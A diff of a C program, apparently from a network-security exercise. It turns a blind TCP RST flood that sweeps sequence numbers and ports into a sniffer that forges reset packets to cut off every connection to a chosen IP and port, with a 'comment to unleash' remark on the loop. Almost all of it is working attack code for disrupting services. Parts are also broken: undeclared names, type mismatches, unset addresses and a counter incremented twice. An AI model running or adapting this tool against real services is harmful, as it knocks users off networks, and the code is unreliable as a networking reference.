@@ -1,3 +1,10 @@
+/*
+ *   A reseter that blocks TCP communication to a given service.
+ *   It sniffs all traffic for packets that match the given IP and port,
+ *   And it will send out reset packets to both the service and the sender
+ *   of packets to terminate the communication.
+*/
+#include <signal.h>
 #include <limits.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -8,12 +15,115 @@
 #include <netdb.h>
 #include <arpa/inet.h>
 #include <netinet/in.h>
+
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
+#include<netinet/ip_icmp.h>
+#include<netinet/udp.h>
 
+
+// Constants
 #define DATAGRAMSIZE 1024 // number of bytes for raw datagram
 #define PSEUDOPACKETSIZE 1024 // number of bytes for pseudo packet
-// #define PAYLOAD ""
+#define DATAGRAM_MAX 65536 // max number of bytes for IP packets
+#define NUM_OF_RESET 42
+
+// Functions
+uint16_t ip_checksum(void*,size_t);
+void reset(const struct sockaddr, const struct sockaddr, 
+    const uint16_t, const uint16_t, const uint32_t, const uint32_t);
+void sigint_handler(int );
+
+// Pseudo header needed for calculating the TCP header checksum
+struct pshdr {
+  uint32_t src_addr;
+  uint32_t dst_addr;
+  uint8_t reserved;
+  uint8_t protocol;
+  uint16_t tcp_len;
+};
+
+int main(int argc, char *argv[]) {
+    int sockfd, count = 0, num, rv, yes = 1;
+    char service_ip[INET6_ADDRSTRLEN];
+    uint16_t service_port;
+    struct sockaddr_storage saddr;
+    struct sockaddr service_addr;
+    socklen_t addr_len;
+    unsigned char buf[DATAGRAM_MAX]; // buffer that holds captured packet
+    struct sigaction sa;
+
+    sa.sa_handler = sigint_handler;
+    sigemptyset(&sigIntHandler.sa_mask);
+    sa.sa_flags = 0;
+    if (sigaction(SIGINT, &sa, NULL) == -1) {
+		perror("sigaction");
+		exit(1);
+	}
+
+    if (argc != 3) {
+	    fprintf(stderr,"usage: reset service_ip service_port\n");
+	    exit(1);
+	}
+
+    if (strlen(argv[1]) > INET6_ADDRSTRLEN) {
+        fprintf(stderr,"please enter a valid IP\n");
+	    exit(1);
+    }
+
+    strcpy(service_ip, argv[1]);
+    inet_pton(AF_INET, service_ip, &(service_addr)); 
+
+    service_port = (uint16_t) atoi(argv[2]);
+    if ((service_port >= USHRT_MAX)) {
+        fprintf(stderr,"service_port < %u\n", USHRT_MAX);
+	    exit(1);
+    }
+
+    // Open raw socket
+    if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
+        perror("fakesync: socket\n");
+        exit(-1);
+    }
+
+    memset(buf, 0, sizeof(buf));
+    struct iphdr *iph = (struct iphdr*)buf;
+    struct tcphdr *tcph = (struct tcphdr *) (iph + 1);
+
+    // // Set option to include protocol header
+    // if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &yes, sizeof yes) <0) {
+    //     perror("fakesync: socketopt()\n");
+    //     exit(-1);
+    // }
+
+
+    // main loop
+    while(1) {
+        // capture frames
+        addr_len = sizeof sa;
+        if ((num = recvfrom(sockfd, buf, sizeof buf, 0, (struct sockaddr *)&saddr, &addr_len)) < 0)
+        {
+            perror("recvfrom()\n");
+            exit(1);
+        }
+
+        if (iph -> protocol != IPPROTO_TCP) continue; // check if packet is TCP packet
+        if (iph -> daddr != service_addr) continue; // check if destination IP matches
+        if (tcph -> dest != service_port) continue; //check if destination port matches
+
+        reset(iph->saddr, iph->daddr, tcph->source, tcph->dest, tcph->seq, tcph->ack_seq);
+
+        break; // comment to unleash
+    }
+    close(sockfd);
+    return 0;
+}
+
+void sigint_handler(int s){
+    (void)s; // quiet unused variable warning
+    printf("terminated by user.\n");
+    exit(0); 
+}
 
 uint16_t ip_checksum(void* vdata,size_t length) {
     // Cast the data pointer to one that can be indexed.
@@ -46,45 +156,19 @@ uint16_t ip_checksum(void* vdata,size_t length) {
     return htons(~acc);
 }
 
-//Pseudo header needed for calculating the TCP header checksum
-struct pshdr {
-  uint32_t src_addr;
-  uint32_t dst_addr;
-  uint8_t reserved;
-  uint8_t protocol;
-  uint16_t tcp_len;
-};
-
-int main(int argc, char *argv[])
+void reset(const struct sockaddr saddr, const struct sockaddr daddr, 
+    const uint16_t sport, const uint16_t dport, const uint32_t seq0, const uint32_t ack0)
 {
-    int sockfd, total = 0, num, yes = 1;
+    int sockfd, count = 0, num, yes = 1;
     char datagram[DATAGRAMSIZE], pseudo_packet[PSEUDOPACKETSIZE], ipstr[INET_ADDRSTRLEN];
-    struct sockaddr_in sa;
     struct iphdr *iph;
     struct tcphdr *tcph, *cstcph;
     struct pshdr *psh;
     char sIP[INET6_ADDRSTRLEN], dIP[INET6_ADDRSTRLEN];
     uint16_t sport = 35801, dport, port0 = 30000, port_max = USHRT_MAX - 1, win = 8192;
     uint16_t id0 = rand() %(65536);
-    uint32_t seq, seq0 = 3842363570, ack0 = 1656549865;
+    // uint32_t seq, seq0 = 3842363570, ack0 = 1656549865;
     size_t tcp_len;
-    // void *data;
-
-    if (argc != 6) {
-	    fprintf(stderr,"usage: reset port0 port_max source dest window\n");
-	    exit(1);
-	}
-
-    port0 = (uint16_t) atoi(argv[1]);
-    port_max = (uint16_t) atoi(argv[2]);
-    if ((port0 >= USHRT_MAX) || (port_max >= USHRT_MAX)) {
-        fprintf(stderr,"0 < port0, port_max < %u\n", USHRT_MAX);
-	    exit(1);
-    }
-
-    strcpy(sIP, argv[3]);
-    strcpy(dIP, argv[4]);
-    win = (uint16_t) atoi(argv[5]);
 
     // Open raw socket without protocol header
     if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
@@ -92,11 +176,11 @@ int main(int argc, char *argv[])
         exit(-1);
     }
 
-    // Set option to include protocol header
-    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &yes, sizeof yes) <0) {
-        perror("fakesync: socketopt()\n");
-        exit(-1);
-    }
+    // // Set option to include protocol header
+    // if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &yes, sizeof yes) <0) {
+    //     perror("fakesync: socketopt()\n");
+    //     exit(-1);
+    // }
 
     // carve out IP header and TCP header
     memset(datagram, 0, sizeof datagram);
@@ -112,7 +196,7 @@ int main(int argc, char *argv[])
     iph -> version = 4; // IPv4
     iph -> ihl = 5; // 5 * 32 bits
     iph -> tos = 0; // DSCP: default; ECN: Not ECN-capable transport
-    iph -> tot_len = htons(sizeof(struct iphdr) + tcp_len); // total length
+    iph -> tot_len = htons(sizeof(struct iphdr) + tcp_len); // count length
     iph -> id = htons(id0); // start ID
     iph -> frag_off = 0x00;
     iph -> ttl = 64; // time to live
@@ -126,9 +210,9 @@ int main(int argc, char *argv[])
     
     // pack TCP header
     tcph -> source = htons(sport); // source port
-    tcph -> dest = 0; // destination port init to 0
-    tcph -> seq = 0; // sequence number initially set to 0
-    tcph -> ack_seq = 0; // ack sequence number
+    tcph -> dest = htons(dport); // destination port
+    tcph -> seq = 0; // sequence number
+    tcph -> ack_seq = 0; // ack sequence number init to 0
     tcph -> res1 = 0;
     tcph -> res2 = 0;
     tcph -> doff = 5; // 5 * 32-bit tcp header
@@ -161,32 +245,21 @@ int main(int argc, char *argv[])
     inet_pton(AF_INET, dIP, &(sa.sin_addr.s_addr));
 
     // RST flood loop
-    for (seq = seq0 ; seq < UINT_MAX - win; seq += win) {
-        for (dport = port0; dport < port_max; dport++) {
+    for (count = 0; count < NUM_OF_RESET; count++) {
+        // tcph -> seq = htonl(seq); // set seq number
+        // cstcph -> seq = htonl(seq); // set seq number in the checksum header
+        tcph -> ack_seq = htonl(ack0++); // set ack seq number
+        cstcph -> ack_seq = htonl(ack0); // set ack seq number in the checksum header
+        tcph -> check = 0; // reset check sum
+        cstcph -> check = 0; // reset check sum  
+        tcph -> check = ip_checksum(pseudo_packet, sizeof(struct pshdr) + tcp_len); // calculate check sum
 
-            // dport = rand() % (port_max - port0 + 1) + port0;
-            tcph -> dest = htons(dport);
-            cstcph -> dest = htons(dport);
-            // tcph -> seq = htonl(seq); // set seq number
-            // cstcph -> seq = htonl(seq); // set seq number in the checksum header
-            tcph -> ack_seq = htonl(seq); // set ack seq number
-            cstcph -> ack_seq = htonl(seq); // set ack seq number in the checksum header
-            tcph -> check = 0; // reset check sum
-            cstcph -> check = 0; // reset check sum  
-            tcph -> check = ip_checksum(pseudo_packet, sizeof(struct pshdr) + tcp_len); // calculate check sum
-
-            // sa.sin_port = htons(dport); // set destination port
-
-            if ((num = sendto(sockfd, datagram, sizeof(struct iphdr) + tcp_len, 0, (struct sockaddr *) &sa, sizeof sa)) < 0)
-            {
-                perror("fakesync: sendto()\n");
-            }
-            if ((total++) % win == 0) {
-                printf( "%d RST packets sent\n", total);
-            }
+        if ((num = sendto(sockfd, datagram, sizeof(struct iphdr) + tcp_len, 0, (struct sockaddr *) &sa, sizeof sa)) < 0)
+        {
+            perror("fakesync: sendto()\n");
+        }
+        if ((count++) % 20 == 0) {
+            printf( "%d RST packets sent\n", count);
         }
     }
-// dport = htons(rand() %(65535+1-1024)+1024); // pick another random destination port
-
-    return 0;
 }
